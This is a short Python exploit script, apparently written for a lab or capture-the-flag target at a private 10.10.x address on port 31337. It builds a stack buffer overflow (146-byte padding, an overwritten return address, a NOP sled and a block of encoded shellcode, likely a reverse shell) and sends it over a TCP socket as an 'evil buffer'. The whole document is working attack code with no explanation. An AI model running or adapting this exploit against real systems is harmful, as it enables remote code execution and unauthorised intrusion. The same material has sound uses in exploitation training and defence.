import socket

ip = "10.10.168.49"
port = 31337
prefix = ""
offset = 146 
overflow = "A" * offset
retn = "\xbf\x16\x04\x08"
padding = "\x90" * 32 
postfix = ""
buf =  b""                                                                                                                                 
buf += b"\xd9\xea\xb8\x50\x26\xa3\xd3\xd9\x74\x24\xf4\x5b\x2b"                                                                             
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\x13\x35\x41"                                                                             
buf += b"\x26\x6f\xd1\x07\xc9\x8f\x22\x68\x43\x6a\x13\xa8\x37"                                                                             
buf += b"\xff\x04\x18\x33\xad\xa8\xd3\x11\x45\x3a\x91\xbd\x6a"                                                                             
buf += b"\x8b\x1c\x98\x45\x0c\x0c\xd8\xc4\x8e\x4f\x0d\x26\xae"                                                                             
buf += b"\x9f\x40\x27\xf7\xc2\xa9\x75\xa0\x89\x1c\x69\xc5\xc4"                                                                             
buf += b"\x9c\x02\x95\xc9\xa4\xf7\x6e\xeb\x85\xa6\xe5\xb2\x05"                                                                             
buf += b"\x49\x29\xcf\x0f\x51\x2e\xea\xc6\xea\x84\x80\xd8\x3a"                                                                             
buf += b"\xd5\x69\x76\x03\xd9\x9b\x86\x44\xde\x43\xfd\xbc\x1c"                                                                             
buf += b"\xf9\x06\x7b\x5e\x25\x82\x9f\xf8\xae\x34\x7b\xf8\x63"                                                                             
buf += b"\xa2\x08\xf6\xc8\xa0\x56\x1b\xce\x65\xed\x27\x5b\x88"                                                                             
buf += b"\x21\xae\x1f\xaf\xe5\xea\xc4\xce\xbc\x56\xaa\xef\xde"                                                                             
buf += b"\x38\x13\x4a\x95\xd5\x40\xe7\xf4\xb1\xa5\xca\x06\x42"                                                                             
buf += b"\xa2\x5d\x75\x70\x6d\xf6\x11\x38\xe6\xd0\xe6\x3f\xdd"                                                                             
buf += b"\xa5\x78\xbe\xde\xd5\x51\x05\x8a\x85\xc9\xac\xb3\x4d"                                                                             
buf += b"\x09\x50\x66\xc1\x59\xfe\xd9\xa2\x09\xbe\x89\x4a\x43"                                                                             
buf += b"\x31\xf5\x6b\x6c\x9b\x9e\x06\x97\x4c\xab\xde\xce\x5b"                                                                             
buf += b"\xc3\xdc\xf0\x63\x21\x68\x16\x09\x59\x3c\x81\xa6\xc0"                                                                             
buf += b"\x65\x59\x56\x0c\xb0\x24\x58\x86\x37\xd9\x17\x6f\x3d"                                                                             
buf += b"\xc9\xc0\x9f\x08\xb3\x47\x9f\xa6\xdb\x04\x32\x2d\x1b"                                                                             
buf += b"\x42\x2f\xfa\x4c\x03\x81\xf3\x18\xb9\xb8\xad\x3e\x40"                                                                             
buf += b"\x5c\x95\xfa\x9f\x9d\x18\x03\x6d\x99\x3e\x13\xab\x22"                                                                             
buf += b"\x7b\x47\x63\x75\xd5\x31\xc5\x2f\x97\xeb\x9f\x9c\x71"                                                                             
buf += b"\x7b\x59\xef\x41\xfd\x66\x3a\x34\xe1\xd7\x93\x01\x1e"                                                                             
buf += b"\xd7\x73\x86\x67\x05\xe4\x69\xb2\x8d\x04\x88\x16\xf8"                                                                             
buf += b"\xac\x15\xf3\x41\xb1\xa5\x2e\x85\xcc\x25\xda\x76\x2b"                                                                             
buf += b"\x35\xaf\x73\x77\xf1\x5c\x0e\xe8\x94\x62\xbd\x09\xbd"
payload = buf

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + '\r\n')
    s.recv(1024)
    print("Done!")
except:
    print("Could not connect.")
